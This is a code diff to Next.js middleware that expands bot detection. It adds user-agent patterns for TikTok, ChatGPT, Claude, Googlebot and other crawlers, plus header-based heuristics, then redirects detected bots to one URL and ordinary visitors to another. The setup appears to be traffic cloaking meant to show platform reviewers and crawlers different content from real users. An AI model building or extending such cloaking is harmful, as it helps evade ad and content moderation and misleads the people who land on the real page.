@@ -32,12 +32,15 @@ function detectBot(request: NextRequest): boolean {
     'trill', // TikTok's previous name in some regions
   ];
 
-  // ChatGPT and AI bot patterns
+  // ChatGPT and AI bot patterns (expanded with more variants)
   const chatGPTAIBotPatterns = [
     'chatgpt-user',
+    'chatgpt',
     'gptbot',
     'openai',
+    'openai-bot',
     'claude-web',
+    'claude',
     'anthropic-ai',
     'anthropic',
     'perplexitybot',
@@ -45,11 +48,18 @@ function detectBot(request: NextRequest): boolean {
     'coherebot',
     'cohere',
     'bingbot',
+    'bingpreview',
     'google-extended',
+    'googlebot',
     'omgilibot',
     'omgili',
     'facebookexternalhit',
+    'facebookbot',
     'meta-externalagent',
+    'meta-externalfetcher',
+    'oai-searchbot', // OpenAI's search bot
+    'dataforseo', // Data scraping service
+    'applebot', // Sometimes used by AI services
   ];
 
   // Check if user-agent contains any TikTok bot patterns
@@ -93,9 +103,21 @@ function detectBot(request: NextRequest): boolean {
   const hasAcceptLanguage = request.headers.has('accept-language');
   const hasAcceptEncoding = request.headers.has('accept-encoding');
   const hasAccept = request.headers.has('accept');
+  const hasCookie = request.headers.has('cookie');
+  const hasSecFetchSite = request.headers.has('sec-fetch-site');
+  const hasDnt = request.headers.has('dnt');
+  const hasUpgradeInsecureRequests = request.headers.has('upgrade-insecure-requests');
 
   // Suspicious if missing multiple standard browser headers
   const suspiciousHeaders = !hasAcceptLanguage && !hasAcceptEncoding;
+
+  // Advanced bot detection: Check for missing browser-specific headers
+  const missingBrowserHeaders = [
+    !hasAcceptLanguage,
+    !hasAcceptEncoding,
+    !hasSecFetchSite,
+    !hasUpgradeInsecureRequests,
+  ].filter(missing => missing).length;
 
   // Decision logic: Prioritize TikTok and ChatGPT/AI bot detection
   // Then consider generic bot patterns combined with missing headers
@@ -105,6 +127,16 @@ function detectBot(request: NextRequest): boolean {
 
   if (isChatGPTAIUserAgent) {
     return true; // Definitely a ChatGPT/AI bot
+  }
+
+  // Advanced detection: Bot-like behavior (missing many browser headers)
+  if (missingBrowserHeaders >= 3) {
+    return true; // Likely a bot - missing too many standard browser headers
+  }
+
+  // No cookies + missing headers = likely bot
+  if (!hasCookie && missingBrowserHeaders >= 2) {
+    return true;
   }
 
   // Generic bot with missing headers is likely automated
@@ -289,6 +321,17 @@ export async function middleware(request: NextRequest) {
 
     // Run bot detection (TikTok, ChatGPT, and other AI bots)
     const isBot = detectBot(request);
+
+    // Log detection for debugging (will appear in Vercel logs)
+    const userAgent = request.headers.get('user-agent') || 'unknown';
+    const referer = request.headers.get('referer') || 'none';
+    console.log('[Bot Detection]', {
+      isBot,
+      userAgent: userAgent.substring(0, 100),
+      referer: referer.substring(0, 100),
+      path: request.nextUrl.pathname,
+      timestamp: new Date().toISOString(),
+    });
 
     // Build redirect URL with preserved path and query parameters
     const targetUrl = isBot ? BOT_URL : REAL_URL;
